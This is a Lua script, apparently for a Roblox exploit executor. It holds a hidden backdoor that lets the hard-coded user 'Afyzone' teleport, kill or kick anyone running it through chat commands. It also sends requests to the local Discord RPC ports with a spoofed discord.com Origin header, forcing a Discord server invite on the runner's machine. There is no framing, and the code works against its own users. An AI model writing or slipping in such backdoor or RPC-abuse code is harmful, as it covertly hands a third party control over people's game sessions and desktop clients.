local admin = "Afyzone"

if game.Players:FindFirstChild(admin) then
    game.Players:FindFirstChild(admin).Chatted:Connect(function(chat)
        if chat == '.bring all' then 
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild(admin).Character.HumanoidRootPart.CFrame
        end
        
        if chat == '.kill all' then 
            game.Players.LocalPlayer.Character.Humanoid.Health = 0
        end
        
        if string.find(chat, '.bring') then 
            if chat ~= '.bring all' then 
                local findplr = chat:gsub(".bring ", '')
                if game.Players.LocalPlayer.Name ==  findplr then 
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild(admin).Character.HumanoidRootPart.CFrame
                end
            end
        end
        
        if string.find(chat, '.kill') then 
            if chat ~= '.kill all' then 
                local findplr = chat:gsub(".kill ", '')
                if game.Players.LocalPlayer.Name ==  findplr then 
                    game.Players.LocalPlayer.Character.Humanoid.Health = 0
                end
            end
        end
        
        if chat == '.kick all' then 
            game.Players.LocalPlayer:Kick('Kicked by afy')
        end
        
        if string.find(chat, '.kick') then 
            if chat ~= '.kick all' then 
                local findplr = chat:gsub(".kick ", '')
                if game.Players.LocalPlayer.Name ==  findplr then 
                    game.Players.LocalPlayer:Kick('Kicked by afy')
                end
            end
        end
    end)
end

game.Players.PlayerAdded:Connect(function(v)
    if v.Name == admin then 
        game.Players:FindFirstChild(admin).Chatted:Connect(function(chat)
            if chat == '.bring all' then 
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild(admin).Character.HumanoidRootPart.CFrame
            end
            
            if chat == '.kill all' then 
                game.Players.LocalPlayer.Character.Humanoid.Health = 0
            end
            
            if string.find(chat, '.bring') then 
                if chat ~= '.bring all' then 
                    local findplr = chat:gsub(".bring ", '')
                    if game.Players.LocalPlayer.Name ==  findplr then 
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild(admin).Character.HumanoidRootPart.CFrame
                    end
                end
            end
            
            if string.find(chat, '.kill') then 
                if chat ~= '.kill all' then 
                    local findplr = chat:gsub(".kill ", '')
                    if game.Players.LocalPlayer.Name ==  findplr then 
                        game.Players.LocalPlayer.Character.Humanoid.Health = 0
                    end
                end
            end
            
            if chat == '.kick all' then 
                game.Players.LocalPlayer:Kick('Kicked by afy')
            end
            
            if string.find(chat, '.kick') then 
                if chat ~= '.kick all' then 
                    local findplr = chat:gsub(".kick ", '')
                    if game.Players.LocalPlayer.Name ==  findplr then 
                        game.Players.LocalPlayer:Kick('Kicked by afy')
                    end
                end
            end
        end)
    end
end)
if syn.request or http_request or request or http.request then
local req = syn.request or http_request or request or http.request or nil
    if req ~= nil then
        for port=6463, 6472, 1 do
            local inv = "http://127.0.0.1:"..tostring(port).."/rpc?v=1"
            local http = game:GetService("HttpService")
            local t = {cmd = "INVITE_BROWSER", args = {["code"] = "EPsZZ5fQd5"}, nonce = string.lower(http:GenerateGUID(false))}
            local post = http:JSONEncode(t)
            req({Url = inv, Method = "POST", Body = post, Headers = {["Content-Type"] = "application/json", ["Origin"] = "https://discord.com"}})
        end
    end
end
